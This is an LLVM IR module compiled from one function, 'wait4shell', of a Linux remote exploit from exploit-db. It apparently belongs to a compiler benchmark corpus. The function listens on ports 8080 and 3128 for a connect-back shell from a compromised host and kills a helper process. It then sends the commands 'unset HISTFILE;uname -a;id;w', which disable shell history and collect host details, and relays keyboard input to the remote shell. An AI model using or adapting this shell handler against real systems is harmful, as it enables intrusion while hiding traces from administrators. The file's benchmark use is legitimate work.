; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_23371.c_wait4shell.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_23371.c_wait4shell.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i8*, %struct.TYPE_2__, i8* }
%struct.TYPE_2__ = type { i8* }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [30 x i8] c"unset HISTFILE;uname -a;id;w\0A\00", align 1
@AF_INET = common dso_local global i8* null, align 8
@INADDR_ANY = common dso_local global i8* null, align 8
@PF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [21 x i8] c"wait4shell::socket/1\00", align 1
@.str.2 = private unnamed_addr constant [21 x i8] c"wait4shell::socket/2\00", align 1
@.str.3 = private unnamed_addr constant [19 x i8] c"wait4shell::bind/1\00", align 1
@.str.4 = private unnamed_addr constant [19 x i8] c"wait4shell::bind/2\00", align 1
@.str.5 = private unnamed_addr constant [21 x i8] c"wait4shell::listen/1\00", align 1
@.str.6 = private unnamed_addr constant [21 x i8] c"wait4shell::listen/2\00", align 1
@.str.7 = private unnamed_addr constant [21 x i8] c"wait4shell::accept/1\00", align 1
@.str.8 = private unnamed_addr constant [13 x i8] c"\0AConnected!\0A\00", align 1
@SIGKILL = common dso_local global i32 0, align 4
@.str.9 = private unnamed_addr constant [18 x i8] c"wait4shell::write\00", align 1
@.str.10 = private unnamed_addr constant [17 x i8] c"wait4shell::read\00", align 1
@.str.11 = private unnamed_addr constant [36 x i8] c"connection closed by foreign host.\0A\00", align 1
@EXIT_FAILURE = common dso_local global i32 0, align 4
@.str.12 = private unnamed_addr constant [24 x i8] c"wait4shell::read remote\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @wait4shell(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [512 x i8], align 16
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  %11 = alloca %struct.sockaddr_in, align 8
  %12 = alloca %struct.sockaddr_in, align 8
  store i32 %0, i32* %2, align 4
  store i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str, i64 0, i64 0), i8** %10, align 8
  %13 = call i32 @memset(%struct.sockaddr_in* %11, i32 0, i32 24)
  %14 = call i32 @memset(%struct.sockaddr_in* %12, i32 0, i32 24)
  %15 = load i8*, i8** @AF_INET, align 8
  %16 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 2
  store i8* %15, i8** %16, align 8
  %17 = load i8*, i8** @INADDR_ANY, align 8
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 1
  %19 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %18, i32 0, i32 0
  store i8* %17, i8** %19, align 8
  %20 = call i8* @htons(i32 8080)
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 0
  store i8* %20, i8** %21, align 8
  %22 = load i8*, i8** @AF_INET, align 8
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %12, i32 0, i32 2
  store i8* %22, i8** %23, align 8
  %24 = load i8*, i8** @INADDR_ANY, align 8
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %12, i32 0, i32 1
  %26 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %25, i32 0, i32 0
  store i8* %24, i8** %26, align 8
  %27 = call i8* @htons(i32 3128)
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %12, i32 0, i32 0
  store i8* %27, i8** %28, align 8
  %29 = load i32, i32* @PF_INET, align 4
  %30 = load i32, i32* @SOCK_STREAM, align 4
  %31 = call i32 @socket(i32 %29, i32 %30, i32 0)
  store i32 %31, i32* %4, align 4
  %32 = icmp slt i32 %31, 0
  br i1 %32, label %33, label %35

33:                                               ; preds = %1
  %34 = call i32 @die(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.1, i64 0, i64 0))
  br label %35

35:                                               ; preds = %33, %1
  %36 = load i32, i32* @PF_INET, align 4
  %37 = load i32, i32* @SOCK_STREAM, align 4
  %38 = call i32 @socket(i32 %36, i32 %37, i32 0)
  store i32 %38, i32* %5, align 4
  %39 = icmp slt i32 %38, 0
  br i1 %39, label %40, label %42

40:                                               ; preds = %35
  %41 = call i32 @die(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.2, i64 0, i64 0))
  br label %42

42:                                               ; preds = %40, %35
  %43 = load i32, i32* %4, align 4
  %44 = bitcast %struct.sockaddr_in* %12 to %struct.sockaddr*
  %45 = call i64 @bind(i32 %43, %struct.sockaddr* %44, i32 24)
  %46 = icmp slt i64 %45, 0
  br i1 %46, label %47, label %49

47:                                               ; preds = %42
  %48 = call i32 @die(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.3, i64 0, i64 0))
  br label %49

49:                                               ; preds = %47, %42
  %50 = load i32, i32* %5, align 4
  %51 = bitcast %struct.sockaddr_in* %11 to %struct.sockaddr*
  %52 = call i64 @bind(i32 %50, %struct.sockaddr* %51, i32 24)
  %53 = icmp slt i64 %52, 0
  br i1 %53, label %54, label %56

54:                                               ; preds = %49
  %55 = call i32 @die(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.4, i64 0, i64 0))
  br label %56

56:                                               ; preds = %54, %49
  %57 = load i32, i32* %4, align 4
  %58 = call i64 @listen(i32 %57, i32 1)
  %59 = icmp slt i64 %58, 0
  br i1 %59, label %60, label %62

60:                                               ; preds = %56
  %61 = call i32 @die(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.5, i64 0, i64 0))
  br label %62

62:                                               ; preds = %60, %56
  %63 = load i32, i32* %5, align 4
  %64 = call i64 @listen(i32 %63, i32 1)
  %65 = icmp slt i64 %64, 0
  br i1 %65, label %66, label %68

66:                                               ; preds = %62
  %67 = call i32 @die(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.6, i64 0, i64 0))
  br label %68

68:                                               ; preds = %66, %62
  %69 = load i32, i32* %4, align 4
  %70 = call i32 @accept(i32 %69, i32* null, i32 0)
  store i32 %70, i32* %6, align 4
  %71 = icmp slt i32 %70, 0
  br i1 %71, label %72, label %74

72:                                               ; preds = %68
  %73 = call i32 @die(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.7, i64 0, i64 0))
  br label %74

74:                                               ; preds = %72, %68
  %75 = load i32, i32* %5, align 4
  %76 = call i32 @accept(i32 %75, i32* null, i32 0)
  store i32 %76, i32* %7, align 4
  %77 = icmp slt i32 %76, 0
  br i1 %77, label %78, label %80

78:                                               ; preds = %74
  %79 = call i32 @die(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.7, i64 0, i64 0))
  br label %80

80:                                               ; preds = %78, %74
  %81 = call i32 @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.8, i64 0, i64 0))
  %82 = load i32, i32* %2, align 4
  %83 = load i32, i32* @SIGKILL, align 4
  %84 = call i32 @kill(i32 %82, i32 %83)
  %85 = load i32, i32* %6, align 4
  %86 = load i8*, i8** %10, align 8
  %87 = load i8*, i8** %10, align 8
  %88 = call i32 @strlen(i8* %87)
  %89 = call i64 @writen(i32 %85, i8* %86, i32 %88)
  %90 = icmp slt i64 %89, 0
  br i1 %90, label %91, label %93

91:                                               ; preds = %80
  %92 = call i32 @die(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.9, i64 0, i64 0))
  br label %93

93:                                               ; preds = %91, %80
  br label %94

94:                                               ; preds = %93, %142
  %95 = call i32 @FD_ZERO(i32* %9)
  %96 = call i32 @FD_SET(i32 0, i32* %9)
  %97 = load i32, i32* %6, align 4
  %98 = call i32 @FD_SET(i32 %97, i32* %9)
  %99 = load i32, i32* %7, align 4
  %100 = call i32 @FD_SET(i32 %99, i32* %9)
  %101 = load i32, i32* %7, align 4
  %102 = add nsw i32 %101, 1
  %103 = call i32 @select(i32 %102, i32* %9, i32* null, i32* null, i32* null)
  %104 = call i64 @FD_ISSET(i32 0, i32* %9)
  %105 = icmp ne i64 %104, 0
  br i1 %105, label %106, label %118

106:                                              ; preds = %94
  %107 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 0
  %108 = call i32 @read(i32 0, i8* %107, i32 512)
  store i32 %108, i32* %3, align 4
  %109 = load i32, i32* %3, align 4
  %110 = icmp sle i32 %109, 0
  br i1 %110, label %111, label %113

111:                                              ; preds = %106
  %112 = call i32 @die(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.10, i64 0, i64 0))
  br label %113

113:                                              ; preds = %111, %106
  %114 = load i32, i32* %6, align 4
  %115 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 0
  %116 = load i32, i32* %3, align 4
  %117 = call i64 @writen(i32 %114, i8* %115, i32 %116)
  br label %118

118:                                              ; preds = %113, %94
  %119 = load i32, i32* %7, align 4
  %120 = call i64 @FD_ISSET(i32 %119, i32* %9)
  %121 = icmp ne i64 %120, 0
  br i1 %121, label %122, label %142

122:                                              ; preds = %118
  %123 = load i32, i32* %7, align 4
  %124 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 0
  %125 = call i32 @read(i32 %123, i8* %124, i32 512)
  store i32 %125, i32* %3, align 4
  %126 = load i32, i32* %3, align 4
  %127 = icmp eq i32 %126, 0
  br i1 %127, label %128, label %132

128:                                              ; preds = %122
  %129 = call i32 @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.11, i64 0, i64 0))
  %130 = load i32, i32* @EXIT_FAILURE, align 4
  %131 = call i32 @exit(i32 %130) #3
  unreachable

132:                                              ; preds = %122
  %133 = load i32, i32* %3, align 4
  %134 = icmp slt i32 %133, 0
  br i1 %134, label %135, label %137

135:                                              ; preds = %132
  %136 = call i32 @die(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.12, i64 0, i64 0))
  br label %137

137:                                              ; preds = %135, %132
  br label %138

138:                                              ; preds = %137
  %139 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 0
  %140 = load i32, i32* %3, align 4
  %141 = call i64 @writen(i32 1, i8* %139, i32 %140)
  br label %142

142:                                              ; preds = %138, %118
  br label %94
}

declare dso_local i32 @memset(%struct.sockaddr_in*, i32, i32) #1

declare dso_local i8* @htons(i32) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @die(i8*) #1

declare dso_local i64 @bind(i32, %struct.sockaddr*, i32) #1

declare dso_local i64 @listen(i32, i32) #1

declare dso_local i32 @accept(i32, i32*, i32) #1

declare dso_local i32 @printf(i8*) #1

declare dso_local i32 @kill(i32, i32) #1

declare dso_local i64 @writen(i32, i8*, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @FD_ZERO(i32*) #1

declare dso_local i32 @FD_SET(i32, i32*) #1

declare dso_local i32 @select(i32, i32*, i32*, i32*, i32*) #1

declare dso_local i64 @FD_ISSET(i32, i32*) #1

declare dso_local i32 @read(i32, i8*, i32) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
